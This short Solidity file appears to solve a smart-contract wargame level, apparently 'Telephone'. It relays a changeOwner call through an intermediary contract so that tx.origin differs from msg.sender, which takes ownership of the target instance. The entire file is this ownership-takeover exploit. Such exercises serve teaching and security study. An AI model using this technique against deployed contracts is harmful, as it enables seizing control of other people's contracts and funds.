// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address newOwner) external;
}

contract Telephone {
    function maskedCall(address instance) external {
        ITelephone(instance).changeOwner(msg.sender);
    }
}